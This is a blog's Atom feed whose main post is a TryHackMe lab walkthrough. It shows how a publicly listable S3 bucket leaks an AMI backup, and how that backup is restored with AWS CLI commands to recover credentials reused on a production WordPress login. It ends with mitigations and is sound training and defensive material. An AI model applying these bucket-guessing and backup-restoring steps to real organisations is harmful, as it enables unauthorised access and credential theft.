@@ -1,0 +1,2002 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-01-16T14:22:20-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">halcyondream</title><subtitle>Portfolio for Cybersecurity projects, research, and developments.</subtitle><entry><title type="html">TryHackMe AWS S3 Walkthrough</title><link href="http://localhost:4000/2024/01/16/thm-aws-s3-walkthrough.html" rel="alternate" type="text/html" title="TryHackMe AWS S3 Walkthrough" /><published>2024-01-16T00:00:00-05:00</published><updated>2024-01-16T00:00:00-05:00</updated><id>http://localhost:4000/2024/01/16/thm-aws-s3-walkthrough</id><content type="html" xml:base="http://localhost:4000/2024/01/16/thm-aws-s3-walkthrough.html">&lt;p&gt;This guide will walk you through the AWS S3 labs’ campaign. The intention is to lay out the attack steps as a methodology with a more natural flow than the labs, which fragment the process as it is broken into different sections.&lt;/p&gt;
+
+&lt;p&gt;Our scope is &lt;em&gt;bestcloudcompany.org&lt;/em&gt; along with all testable AWS components. We will try to focus on all aspects of the campaign, keeping an eye towards AWS-specific components as they appear.&lt;/p&gt;
+
+&lt;h2 id=&quot;background-and-methodology&quot;&gt;Background and Methodology&lt;/h2&gt;
+
+&lt;p&gt;The &lt;em&gt;TryHackMe&lt;/em&gt; labs offer a few approaches for targeting S3 buckets specifically during an assessment:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Subdomain Enumeration&lt;/strong&gt;. This can lead, either directly or indirectly, to a valid and open S3 bucket. The usefulness of such buckets will rely entirely on their permissions—or, rather, their &lt;em&gt;lack&lt;/em&gt; of permissions. You can leverage tools like the &lt;a href=&quot;https://crt.sh&quot;&gt;Crt.sh&lt;/a&gt; to help with your enumeration efforts.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;DNS Reconnaissance&lt;/strong&gt;. This can help you map IPs to valid AWS Services and, conversely, URLs to such IPs. You can use tools like &lt;em&gt;nslookup&lt;/em&gt; for IPs and domains or subdomains. AWS Service artifacts will include key terms like “ec2” or “s3.”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We will leverage these hints in order to discover any public buckets as appropriate.&lt;/p&gt;
+
+&lt;p&gt;Although this is intended for offensive strategy for S3 buckets, try to approach this as a more “holistic” penetration test or application assessment. Approaching such an assessment without assumptions, even in a lab, will provide you with an opportunity to see the larger picture and will lead to better findings. This will serve you in real-world situations and, in my personal opinion, serve to enrich the labs provided by THM.&lt;/p&gt;
+
+&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h2&gt;
+
+&lt;p&gt;The THM guide recommends two approaches for S3 bucket discovery: DNS Recon and Subdomain enumeration. These are both useful for discovering evidence of AWS services.&lt;/p&gt;
+
+&lt;p&gt;Before we approach these, let’s see what our scoped domain is &lt;em&gt;supposed&lt;/em&gt; to do. This will give us an idea of the developers’ intentions and help us understand any blind spots along the way.&lt;/p&gt;
+
+&lt;h3 id=&quot;open-services&quot;&gt;Open services&lt;/h3&gt;
+
+&lt;p&gt;You can run &lt;em&gt;nmap&lt;/em&gt; against the URL:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ nmap -Pn bestcloudcompany.org
+...
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The only open ports are web ports. This is incredibly useful as it narrows the scope of our reconnaissance and, later, our exploit approaches. These results also shed some light on the developers’ intentions, as well as any assumptions or pitfalls.&lt;/p&gt;
+
+&lt;p&gt;In short, we have a web application. Let’s check it out.&lt;/p&gt;
+
+&lt;h3 id=&quot;application&quot;&gt;Application&lt;/h3&gt;
+
+&lt;p&gt;First, let’s open &lt;em&gt;bestcloudcompany.org&lt;/em&gt; in a browser. Observe that this is a landing page with a blog and some small capabilities.&lt;/p&gt;
+
+&lt;p&gt;Scroll down and observe that this is “powered by WordPress.” This is a bad sign already since WordPress is notoriously insecure by default and the platform is the subject of many AppSec trainings. That aside, it also means that some WordPress functionality may be available to the public internet. For example, try to open http://bestcloudcompany.org/wp-login.php, a well-known WordPress login URI.&lt;/p&gt;
+
+&lt;p&gt;The login page loads. If you were doing a more AppSec-focused assessment, you might try password brute-forcing or injection attacks to bypass this page.&lt;/p&gt;
+
+&lt;p&gt;You are welcome to play around with any other WordPress quirks or functionalities. In this case, let’s make a note of this capability and return to it later.&lt;/p&gt;
+
+&lt;p&gt;Note that you could use a tool like Burp Suite or OWASP ZAP to enumerate both traffic and page content. This would be appropriate to discovering open and insecure services, including AWS Services, through page content or request-response history. Preferably, you would want to walk through the webapp yourself, and leverage crawlers as appropirate.&lt;/p&gt;
+
+&lt;p&gt;In my case, no evidence of AWS Services appeared in the the page history or content. (However, I have performed assessments where the developers refer directly to S3 buckets, so it’s worth trying this in a real-world web pentest.) This is a dead end. Let’s move on to other recon tactics.&lt;/p&gt;
+
+&lt;h3 id=&quot;subdomain-enumeration&quot;&gt;Subdomain Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Now, let’s try to find any subdomains associated with the site or organization. Often, subdomains point to additional resources for the organization, including webpage content, webapp resources, and separate applications. Sometimes, they point to storage units that hold backups or secrets.&lt;/p&gt;
+
+&lt;p&gt;Let’s start by using &lt;em&gt;Crt.sh&lt;/em&gt; to enumerate any subdomains discovered by certificate transparency logs. Open the site and search for &lt;em&gt;bestcloudcompany.org&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Observe that &lt;em&gt;assets.bestcloudcompany.org&lt;/em&gt; appears. Based solely on the name, we can speculate whether this is used to store information for the organization’s website.&lt;/p&gt;
+
+&lt;p&gt;There are other subdomains listed, and you are welcome to try them. None of them loaded anything for me (&lt;em&gt;nmap&lt;/em&gt;, browser, etc.), so they weren’t actionable in this assessment. Let’s proceed with the &lt;em&gt;assets&lt;/em&gt; subdomain.&lt;/p&gt;
+
+&lt;p&gt;A simple &lt;em&gt;nmap&lt;/em&gt; scan will report that, again, ports 80 and 443 are open. However, if you try to load these in the browser, nothing happens. Still, this is indicative that &lt;em&gt;something&lt;/em&gt; is there, so let’s try to push this a little further.&lt;/p&gt;
+
+&lt;h3 id=&quot;dns-reconnaissance&quot;&gt;DNS Reconnaissance&lt;/h3&gt;
+
+&lt;p&gt;First, let’s use &lt;em&gt;nslookup&lt;/em&gt; on the &lt;em&gt;bestcloudcompany.org&lt;/em&gt; domain. Take one of the IPs and then perform the same thing to view more information about who is hosting this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Look up the scoped URL.
+~$ nslookup bestcloudcompany.org
+Server:		1.1.1.1
+Address:	1.1.1.1#53
+
+Non-authoritative answer:
+Name:	bestcloudcompany.org
+Address: 44.203.62.152
+
+# Look up the IP from the previous answer
+~$ nslookup 44.203.62.152
+Server:		1.1.1.1
+Address:	1.1.1.1#53
+
+Non-authoritative answer:
+152.62.203.44.in-addr.arpa	name = ec2-44-203-62-152.compute-1.amazonaws.com.
+
+Authoritative answers can be found from:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this case, the &lt;em&gt;name&lt;/em&gt; in the second answer shows some evidence of an AWS EC2 service. This tells us that we are working with a web application hosted from an EC2 instance. Since such an instance is effectively a full-on virtual machine, we can further speculate that, if we can find a way in, we can leverage the system’s inbuilt tools (for example, the Linux command line) for lateral movement or secrets enumeration.&lt;/p&gt;
+
+&lt;p&gt;Now, let’s take the &lt;em&gt;assets&lt;/em&gt; subdomain and perform a similar search:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ nslookup assets.bestcloudcompany.org
+Server:		1.1.1.1
+Address:	1.1.1.1#53
+
+Non-authoritative answer:
+Name:	assets.bestcloudcompany.org
+Address: 18.239.225.25
+Name:	assets.bestcloudcompany.org
+Address: 18.239.225.57
+Name:	assets.bestcloudcompany.org
+Address: 18.239.225.109
+Name:	assets.bestcloudcompany.org
+Address: 18.239.225.94
+
+~$ nslookup 18.239.225.25
+Server:		1.1.1.1
+Address:	1.1.1.1#53
+
+Non-authoritative answer:
+25.225.239.18.in-addr.arpa	name = server-18-239-225-25.mia3.r.cloudfront.net.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The second answer’s &lt;em&gt;name&lt;/em&gt; reveals that the &lt;em&gt;assets&lt;/em&gt; subdomain is behind AWS CloudFront, a CDN that provides other features like WAF and Firewall rules. You are welcome to poke around at this as an exercise, but be careful not to trigger any WAF protections, such as extreme rate-limiting or IP blocklisting. For now, let’s try a different approach.&lt;/p&gt;
+
+&lt;p&gt;As a heuristic, “assets” may indicate a collection or storage unit with files or objects, regardless of whether they are used by the web application or for some other purpose. We also know that this is behind a CloudFront CDN. A common AWS example of this is hiding an S3 bucket behind CloudFront to limit who can access those files or objects.&lt;/p&gt;
+
+&lt;p&gt;With this in mind, we can hypothesize that, if we can find (or guess) an S3 URI that is publicly accessible, then we can access the bucket itself. Again, the usefulness of this will depend on whether or not the objects in the buckets are open or restricted. (As a further consideration, this &lt;em&gt;could&lt;/em&gt; also indicate an EC2 instance with a file server or a web server that provides the assets. However, an S3 bucket would accomplish the same thing with less effort, so we can push in that direction first.)&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation-with-aws-services&quot;&gt;Exploitation with AWS services&lt;/h2&gt;
+
+&lt;p&gt;Let’s recap the first section. First, we discovered a public-facing web application running on an EC2 instance. We also found an &lt;em&gt;assets&lt;/em&gt; subdomain whose purpose is not clear at this time.&lt;/p&gt;
+
+&lt;p&gt;During recon, we also gathered a few data points that suggest we are working with an AWS application: the existence of EC2 and CloudFront. Let’s try to push these in order to see if there are any public endpoints, files, or services exposed. Knowing that it is common to hide S3 buckets behind CloudFront, we can try to determine if there is any way to access a bucket associated with the &lt;em&gt;assets&lt;/em&gt; subdomain, and see what else we can do.&lt;/p&gt;
+
+&lt;h3 id=&quot;trying-a-common-s3-naming-convention&quot;&gt;Trying a common S3 naming convention&lt;/h3&gt;
+
+&lt;p&gt;Although there are lists with S3 URL patterns, the default format at the time of writing is:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://&amp;lt;bucketname&amp;gt;.s3.amazonaws.com/&amp;lt;filename&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;(You can test this in an AWS S3 bucket of your own and test if the convention has changed.)&lt;/p&gt;
+
+&lt;p&gt;An organization may follow a consistent convention for naming their buckets. The specifics will depend on the organization. However, suppose an organization chooses to name their buckets based on a domain or subdomain under their control. Using this, we can try to form an S3 URL like:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://assets.bestcloudcompany.org.s3.amazonaws.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If the bucket is availble to the public, then opening this in a browser will return an XML with the contents of the buckets or with an “Access Denied” error. In this case, it returns the following, which indicates that this is in fact an S3 bucket whose contents are available to the public web:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;ListBucketResult&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Name&amp;gt;&lt;/span&gt;assets.bestcloudcompany.org&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Name&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Prefix/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Marker/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;MaxKeys&amp;gt;&lt;/span&gt;1000&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MaxKeys&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;IsTruncated&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/IsTruncated&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Contents&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Key&amp;gt;&lt;/span&gt;ami-056a6742115906e8c.bin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Key&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;LastModified&amp;gt;&lt;/span&gt;2022-05-04T20:17:01.000Z&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastModified&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;ETag&amp;gt;&lt;/span&gt;&quot;65247a1c5755517a32636c78de3d624a-177&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ETag&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;1483486006&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;StorageClass&amp;gt;&lt;/span&gt;STANDARD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/StorageClass&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Contents&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Contents&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Key&amp;gt;&lt;/span&gt;index.html&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Key&amp;gt;&lt;/span&gt;
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here, we can see a few key data points:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The &lt;em&gt;Name&lt;/em&gt; tag confirms our hypothesis that the subdomain is also the bucket name&lt;/li&gt;
+  &lt;li&gt;The contents are available and listed&lt;/li&gt;
+  &lt;li&gt;The first &lt;em&gt;Key&lt;/em&gt; tag shows a &lt;em&gt;.bin&lt;/em&gt; file that starts with “ami”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The &lt;em&gt;ami&lt;/em&gt; file is interesting as it may refer to an Amazon Machine Images backup. Often, these backups are deployed to S3 buckets. You can download the file and inspect the contents but may not find much of interest; there is no clear file signature (&lt;em&gt;file&lt;/em&gt; reports it as &lt;em&gt;data&lt;/em&gt;), and I haven’t found a way to extract the system contents from one of these files at the time of writing.&lt;/p&gt;
+
+&lt;p&gt;Still, if we can load the system, we can access it and inspect the contents. This may reveal key information: the web application’s source code, hardcoded or stored credentials, and the underlying operating system.&lt;/p&gt;
+
+&lt;h3 id=&quot;restoring-the-ami-vm-image&quot;&gt;Restoring the AMI VM image&lt;/h3&gt;
+
+&lt;p&gt;&lt;em&gt;Note: If you are doing this in TryHackMe, you can skip these steps unless you want to learn more about the underlying AWS service configuration. This is intended for people who are trying to access without the THM platform.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The formal way to load an AMI image, even only with the purpose of extracting its contents, is to load it from an S3 bucket and import it as an EC2 instance. The bucket at &lt;em&gt;assets.bestcloudcompany.org&lt;/em&gt; has solved the first step. Now let’s approach the next.&lt;/p&gt;
+
+&lt;p&gt;Instead of setting up the whole environment for analysis, we could &lt;a href=&quot;https://docs.aws.amazon.com/vm-import/latest/userguide/vmexport.html&quot;&gt;export it to another format&lt;/a&gt;: OVA, VMDK, and a few others. This may prove useful if we only want to perform static analysis, or if we want to run the instance outside of AWS. However, we still need to import the AMI file, and since the export process requires another S3 bucket for output, that will take more time and space in the export bucket. In this case, it may be simpler to just set up a simple environment which permits SSH access, then delete those settings after we finish the lab.&lt;/p&gt;
+
+&lt;p&gt;With that in mind, our strategy is to connect to the EC2 instance’s operating system. We can leverage SSH because it’s fairly simple. With AWS, we will need to do the following steps:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Restore the AMI image to an EC2 instance&lt;/li&gt;
+  &lt;li&gt;Generate an SSH keypair, which is required for &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html&quot;&gt;AWS SSH connections into EC2 instances&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Create an EC2 security group which allows for inbound and outbound SSH&lt;/li&gt;
+  &lt;li&gt;Launch the instance with these settings&lt;/li&gt;
+  &lt;li&gt;Connect using SSH and the newly-created private key&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;First, let’s import the AMI VM image into an EC2 instance. Use the AMI key and the &lt;em&gt;assets.bestcloudcompany.org&lt;/em&gt; bucket name, both of which are returned when you open the bucket in a browser. You can use an arbitrary name for the bucket.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 create-restore-image-task \
+    --object-key ami-056a6742115906e8c.bin \
+    --bucket assets.bestcloudcompany.org \
+    --name s3labvm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If successful, it will return an identifier ID. Take note of it as you will need this later.&lt;/p&gt;
+
+&lt;p&gt;Next, create an SSH keypair. This will store your keypair in AWS and allow you to save it to a file. Set the local private key to read-execute only for the owner:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 create-key-pair \
+     --key-name THMLabKeys \
+     --query &quot;KeyMaterial&quot; \
+     --output text &amp;gt; ~/.ssh/bestkeys.pem &amp;amp;&amp;amp; \
+   chmod 600 ~/.ssh/bestkeys.pem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Although you can use any &lt;em&gt;key-name&lt;/em&gt;, take note of it as you will need it when launching the instance.&lt;/p&gt;
+
+&lt;p&gt;Next, create a new EC2 Security Group which permits SSH access. You can do so using the AWS web console or the command line.&lt;/p&gt;
+
+&lt;p&gt;Since this is closer to a prototype than a full-on application, we only need to allow SSH. (Remember to delete this group later if you don’t need it after the lab.) The end result will create a group that looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 describe-security-groups --profile default
+{
+    &quot;SecurityGroups&quot;: [
+        ...
+        {
+            &quot;Description&quot;: &quot;Allows SSH&quot;,
+            &quot;GroupName&quot;: &quot;allowSSH&quot;,
+            &quot;IpPermissions&quot;: [
+                {
+                    &quot;FromPort&quot;: 22,
+                    &quot;IpProtocol&quot;: &quot;tcp&quot;,
+                    &quot;IpRanges&quot;: [
+                        {
+                            &quot;CidrIp&quot;: &quot;0.0.0.0/0&quot;
+                        }
+                    ],
+                    &quot;Ipv6Ranges&quot;: [],
+                    &quot;PrefixListIds&quot;: [],
+                    &quot;ToPort&quot;: 22,
+                    &quot;UserIdGroupPairs&quot;: []
+                }
+            ],
+            &quot;OwnerId&quot;: &quot;...&quot;,
+            &quot;GroupId&quot;: &quot;sg-...&quot;,
+            &quot;IpPermissionsEgress&quot;: [
+                {
+                    &quot;FromPort&quot;: 22,
+                    &quot;IpProtocol&quot;: &quot;tcp&quot;,
+                    &quot;IpRanges&quot;: [
+                        {
+                            &quot;CidrIp&quot;: &quot;0.0.0.0/0&quot;
+                        }
+                    ],
+                    &quot;Ipv6Ranges&quot;: [],
+                    &quot;PrefixListIds&quot;: [],
+                    &quot;ToPort&quot;: 22,
+                    &quot;UserIdGroupPairs&quot;: []
+                }
+            ],
+            &quot;VpcId&quot;: &quot;vpc-...&quot;
+        }
+    ]
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Take note of the &lt;em&gt;GroupId&lt;/em&gt; value, which begins with “sg-“, as you will need it when launching the instance. (In this screenshot, its full value is redacted, but yours will be a small hex string.)&lt;/p&gt;
+
+&lt;p&gt;Now, launch the instance, using the configuration values you got from previous steps:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 run-instances \
+    --image-id ami-... \
+    --instance-type t3a.micro \
+    --key-name THMLabKeys \
+    --security-group-id sg-...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Copy the &lt;em&gt;InstanceId&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;It will take a minute for the instance to spin up. You can check it with:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 describe-instance-status --instance-id i-...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The instance will have a &lt;em&gt;Status&lt;/em&gt; of “initializing” until it’s ready. Once ready, you can find the Public IP address using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ec2:DescribeInstances&lt;/code&gt; API call along with the instance ID and a query:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 describe-instances \
+    --instance-id i-02f05991f4a149991 \
+    --query &apos;Reservations[*].Instances[*].PublicIpAddress&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once you have the public IP address, you can connect with SSH and your new keypair. We don’t yet know if any users exist on this system; but we do know that SSH by default will permit root access. Let’s try this user first:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ ssh -i ~/.ssh/bestkeys.pem root@&amp;lt;publicIpAddress&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The login attempt fails with a message to try the &lt;em&gt;bitnami&lt;/em&gt; user instead of &lt;em&gt;root&lt;/em&gt;. Modify that SSH command to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bitnami@&amp;lt;publicIpAddress&amp;gt;&lt;/code&gt;. Login is successful.&lt;/p&gt;
+
+&lt;p&gt;Upon login, you can poke around at the environment. This is a Debian-based Linux system, so feel free to leverage any shell commands to find anything of interest. My searching led to a few interesting findings:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;A file in the &lt;em&gt;bitnami&lt;/em&gt; user’s home which contains credentials. These credentials are, according to the contents, able to be used for different applications or databases.&lt;/li&gt;
+  &lt;li&gt;An HTTP server running on localhost. You can test this with &lt;em&gt;curl&lt;/em&gt;, but the content isn’t easy to read in the shell. To help with this, you could exfiltrate the file (using &lt;em&gt;scp&lt;/em&gt;) to your host system for inspection. I found it easier just to install the &lt;em&gt;w3m&lt;/em&gt; console-based web browser, then open the homepage.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Either way, you’ll notice that the localhost-ed site is nearly identical to the one at &lt;em&gt;bestcloudcompany.org&lt;/em&gt;. We can infer that we might be using a clone of that production site. As further testing, we can prove that &lt;em&gt;localhost/wp-login.php&lt;/em&gt; exists.&lt;/p&gt;
+
+&lt;p&gt;Using the credentials from the file in the home directory, logging in to the &lt;em&gt;localhost&lt;/em&gt; site will succeed, sort of. (It gives a message about changing some administrator settings, but the login itself succeeded; if the credentials were invalid, this would have prompted us to log in again.) Regardless, if this really is a clone of the site, then maybe there’s some credential reuse with both applications.&lt;/p&gt;
+
+&lt;p&gt;Go to &lt;em&gt;https://bestcloudcompany.org/wp-login.php&lt;/em&gt; and try the credentials. Login is successful (womp, womp). The flag is in the user’s profile description, although it doesn’t use any indicators that it is in fact the flag.&lt;/p&gt;
+
+&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;
+
+&lt;h2 id=&quot;root-cause-analysis&quot;&gt;Root cause analysis&lt;/h2&gt;
+
+&lt;p&gt;The application overall suffers from a few problems, which we can align with the CWE Top 25:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Improper Authorization (CWE-862)&lt;/strong&gt;. Once we identified the S3 bucket’s name, we could view everything within the bucket, including the application server backup, which contains sensitive and useful information.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Improper Authentication (CWE-287)&lt;/strong&gt;. The backup server’s &lt;em&gt;bitnami&lt;/em&gt; account can log in without a password. Since we didn’t observe port 22 open on the production application, the developers may have believed that this is a non-issue, especially since AWS handles the SSH key management. In this case, the backup led to near-direct system access. Further, we might argue that the WordPress application should enforce multifactor authentication.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Use of Hard-Coded Credentials (CWE-798)&lt;/strong&gt;. In this case, the &lt;em&gt;bitnami&lt;/em&gt; account contains the hardcoded credentials for a web-facing account. This might also be an example of “password reuse” which is still a major problem with many organizations and end-users.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;mitigations&quot;&gt;Mitigations&lt;/h2&gt;
+
+&lt;p&gt;To prevent such attacks in the future, the organization might take the following measures.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Apply a restrictive policy to S3 buckets. At the bare minimum, limit resources to only valid IAM principals within the organization. Ideally, someting like backups will be accessible only to a subset of members in the organization who work with system backup and restore.&lt;/li&gt;
+  &lt;li&gt;Separation of duties. Put backups into a separate, very restrictive bucket to avoid leakage to the public web. If a bucket is used for backups and web content (it shouldn’t), consider creating a folder within the bucket and apply robust IAM policies to that folder and its contents.&lt;/li&gt;
+  &lt;li&gt;Leverage multifactor authentication. This prevents anyone with the username and password from gaining direct access to the account. In this case, it would have prevented us from getting the flag.&lt;/li&gt;
+  &lt;li&gt;Use unique passwords and avoid password reuse. Where possible, leverage a password wallet and lock down that wallet’s access as appropriate.&lt;/li&gt;
+  &lt;li&gt;Remove hardcoded secrets. Although this usually applies to content returned to the user, in this case, we still got the credentials. If the application were vulnerable to command injection, it might be possible to extract them from the public internet, targeting the same file and dumping the file contents.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">This guide will walk you through the AWS S3 labs’ campaign. The intention is to lay out the attack steps as a methodology with a more natural flow than the labs, which fragment the process as it is broken into different sections.</summary></entry><entry><title type="html">Ideas for adapting to A.I. plagiarism in the classroom</title><link href="http://localhost:4000/2023/10/13/chatgpt-assignments.html" rel="alternate" type="text/html" title="Ideas for adapting to A.I. plagiarism in the classroom" /><published>2023-10-13T00:00:00-04:00</published><updated>2023-10-13T00:00:00-04:00</updated><id>http://localhost:4000/2023/10/13/chatgpt-assignments</id><content type="html" xml:base="http://localhost:4000/2023/10/13/chatgpt-assignments.html">&lt;p&gt;A.I. presents a new spin to the classic problem of cheating in higher-level education. To counter these challenges, I offer some ideas on how to develop assignments with the caveats presented by these content-generating platforms. As a whole, this should all promote a shift in the fidelity of assignments as well as the role of the instructional leadership teams for any course.&lt;/p&gt;
+
+&lt;p&gt;As a baseline, I will first use ChatGPT to cheat on an assignment. Then, I will try to use GPTZero to determine if I had cheated in the first place. I conclude with ways to mitigate the cat-and-mouse game of GPT creation and detection, along with considerations for how the instructional team can use these opportunities to forster professional mentorship and create meaningful assignments.&lt;/p&gt;
+
+&lt;p&gt;Let’s begin with our first assignment: generating a Wordle clone in Python.&lt;/p&gt;
+
+&lt;h1 id=&quot;generate-a-four-letter-word&quot;&gt;Generate a four-letter word&lt;/h1&gt;
+
+&lt;p&gt;Recently I was browsing GitHub and came across a fun Wordle clone, written in rather simple Python. For context, I have never played Wordle. So I did a little research and tried to figure out if this solution was a faithful implementation of the game. (It was.)&lt;/p&gt;
+
+&lt;p&gt;While browsing, I encountered a few similar examples, also in Python. One particular implementation caught my eye; not because of the solution, but because the author wrote a working example, had an issue, couldn’t explain the issue, and everyone else rightly pointed out that their code did, actually, work just fine. You see this kind of behavior with undergraduate code, where a well-intended student is learning a langauge and needs some support and maybe some empathy.&lt;/p&gt;
